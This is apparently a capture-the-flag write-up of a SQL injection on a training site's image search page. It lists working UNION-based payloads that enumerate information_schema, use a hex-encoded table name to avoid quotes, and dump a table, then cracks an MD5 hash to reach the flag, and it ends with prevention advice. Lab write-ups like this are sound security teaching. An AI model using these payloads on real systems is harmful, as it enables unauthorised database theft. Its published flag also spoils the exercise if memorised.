# SQL Injection: Image Search Page Vulnerability

## Overview

A SQL Injection vulnerability on the Image Search page, allows attackers extract database details and sensitive content.

---

## Discovery & Exploitation

### 1. Confirm the Vulnerability
- Input in search: `1' OR TRUE`
- Result: With single quote did not work.

- Enter `1 OR TRUE` in the image ID input field.
- Result: All 5 images are displayed, confirming SQL injection.

### 2. Extract DB and Table Info
- Enter `-1 union select database(), user()` in the ID field.
- Result:  
  - **ID:** -1 union select database(), user()  
  - **Title:** borntosec@localhost  
  - **Url:** Member_images

- Query: `-1 UNION SELECT 1,table_name FROM information_schema.tables `
- Result: Reveals all Table names

### 3. Enumerate Structure
- Enter `-1 UNION SELECT table_name, column_name FROM information_schema.columns WHERE table_schema=database() --` in the ID field.
- Result: Reveals table/column names, e.g.:  
  `list_images (id, url, title, comment)`

another option is directly using hex value of the Table "list_images" which is 0x6C6973745F696D61676573
since using quote i.e. FROM "users" is not possible

- Query: `-1 union select column_name, table_name FROM information_schema.columns WHERE table_name LIKE 0x6C6973745F696D61676573`
- Result: Lists table/column names (e.g., `list_images`, `id`, `url`, `title`, `comment`, etc.)

### 4. Dump Table Data
- Enter `-1 UNION SELECT concat(id, url), concat(title,comment) FROM list_images --` in the ID field.
- Result: Shows all image data, including a challenge.

---

## Challenge: Crack the Flag

- **Extracted MD5 hash:** `1928e8083cf461a51303633093573c46`
- **How to decode:**  
  Use online services like [dcode.fr](https://www.dcode.fr/md5-hash) or [crackstation.net](https://crackstation.net) to look up or crack MD5 hashes.

- **MD5 decrypted:** `albatroz`  
- **Convert to lowercase:** `albatroz`  
- **Get SHA256:**

    ```bash
    echo -n 'albatroz' | sha256sum
    ```

- **Flag:**  
  `f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188`

---

## Prevention

1. **Parameterized Queries**
    ```php
    $stmt = $db->prepare("SELECT * FROM list_images WHERE id = ?");
    $stmt->bind_param("i", $id);
    ```
2. **Input Validation**
    ```php
    if (!is_numeric($id)) { exit("Invalid input"); }
    ```
3. **Database Security**
    - Use least-privilege accounts
    - Suppress detailed error messages
    - Monitor DB activity

4. **Web Application Firewall**
    - Deploy a WAF to block known attack patterns

5. **Regular Security Testing**
    - Conduct routine scans and penetration tests

---

> Even basic input validation failures can lead to total database compromise. Always validate and sanitize user input.
